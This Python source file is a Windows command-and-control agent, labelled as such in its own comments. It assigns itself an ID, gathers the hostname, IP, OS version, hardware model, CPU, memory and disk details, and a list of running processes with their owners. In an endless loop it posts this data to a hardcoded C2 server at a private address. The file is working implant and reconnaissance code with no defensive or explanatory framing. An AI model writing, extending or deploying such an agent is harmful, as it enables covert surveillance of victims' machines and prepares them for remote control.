import requests
import socket
import time
import uuid
import platform
import psutil
from datetime import datetime, timedelta
import subprocess
import win32com.client
import os

# URL of the C2 server
SERVER_URL = "http://192.168.31.132:5000"

# Generate a unique agent ID
AGENT_ID = str(uuid.uuid4())

def get_active_ip():
    """Fetch the active IP address of the machine."""
    try:
        # Connect to an external server to determine the correct network interface
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  # Google's public DNS server
            return s.getsockname()[0]
    except Exception:
        # Fallback if no connection is available
        return "127.0.0.1"

def bytes_to_human_readable(byte_size):
    """Convert bytes to human-readable format (GB, MB, KB)."""
    for unit in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if byte_size < 1024.0:
            return f"{byte_size:.2f} {unit}"
        byte_size /= 1024.0
    return f"{byte_size:.2f} PB"

def format_uptime(seconds):
    """Convert uptime seconds to a human-readable format (days, hours, minutes, seconds)."""
    days, rem = divmod(seconds, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{int(days)} days, {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds"

def get_windows_version():
    version = platform.version()  # Kernel version
    release = platform.release()  # General release (e.g., 10)
    build = os.sys.getwindowsversion().build  # Build number

    # Map of Windows builds to versions
    windows_version_map = {
        "XP": (5, 1),
        "Vista": (6, 0),
        "7": (6, 1),
        "8": (6, 2),
        "8.1": (6, 3),
        "10": (10, 0),
        "11": (10, 0),  # Distinguish by build number >= 22000
    }

    # Detect major and minor versions
    major = os.sys.getwindowsversion().major
    minor = os.sys.getwindowsversion().minor

    # Find the version name
    for name, (ver_major, ver_minor) in windows_version_map.items():
        if (major, minor) == (ver_major, ver_minor):
            if name == "10" and build >= 22000:
                return f"Windows 11 (Version: {version}, Build: {build})"
            return f"Windows {name} (Version: {version}, Build: {build})"

    # Fallback if version isn't in the map
    return f"Windows {release} (Version: {version}, Build: {build})"

def get_computer_model_with_com():
    try:
        objWMI = win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2")
        systems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
        for system in systems:
            return system.Model
    except Exception as e:
        return f"Error: {e}"

def get_system_info():
    """Collect detailed system information."""
    system_info = {
        'hostname': socket.gethostname(),
        'ip': get_active_ip(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.architecture()[0],
        'uptime': format_uptime(time.time() - psutil.boot_time()),  # Convert to readable uptime
        'kernel_version': platform.release(),
        'model': get_computer_model_with_com(),
    }

    # CPU info
    system_info['cpu'] = {
        'model': platform.processor(),
        'cores': psutil.cpu_count(logical=False),
        'logical_processors': psutil.cpu_count(logical=True),
        'cpu_percent': psutil.cpu_percent(interval=1),
    }

    # Memory info
    memory = psutil.virtual_memory()
    system_info['memory'] = {
        'total': bytes_to_human_readable(memory.total),
        'available': bytes_to_human_readable(memory.available),
        'used': bytes_to_human_readable(memory.used),
        'percent': memory.percent,
    }

    # Disk info
    disk = psutil.disk_usage('/')
    system_info['disk'] = {
        'total': bytes_to_human_readable(disk.total),
        'used': bytes_to_human_readable(disk.used),
        'free': bytes_to_human_readable(disk.free),
        'percent': disk.percent,
    }

    # Get running processes categorized as Apps or Background processes
    apps = []
    background_processes = []

    system_accounts = ['SYSTEM', 'LOCAL SERVICE', 'NETWORK SERVICE']
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
        try:
            username = proc.info['username']
            cpu_percent = proc.info['cpu_percent']
            memory_percent = proc.info['memory_percent']

            # Filter out system processes based on known system accounts
            if username in system_accounts or cpu_percent < 1 or memory_percent < 1:
                background_processes.append(proc.info)  # Likely background processes
            else:
                # Consider apps based on significant resource usage
                apps.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    system_info['processes'] = {
        'apps': apps,
        'background_processes': background_processes
    }

    return system_info

def register_with_server():
    """Register the agent with the C2 server."""
    try:
        data = {
            "agent_id": AGENT_ID,
            "ip": get_active_ip(),
            "hostname": socket.gethostname(),
            "os": get_windows_version(),
            "system_info": get_system_info()  # Send system info along with registration
        }
        response = requests.post(f"{SERVER_URL}/register", json=data)
        if response.status_code == 200:
            print("Registered:", response.json())
        else:
            print(f"Registration failed: {response.status_code}")
    except Exception as e:
        print("Registration error:", e)

def main():
    while True:
        try:
            # Register with the C2 server and send system information
            register_with_server()

            # Check for tasks every 30 seconds
            # check_for_tasks()
        except Exception as e:
            print("Error:", e)

        #time.sleep(30)  # Send heartbeat every 30 seconds

if __name__ == "__main__":
    main()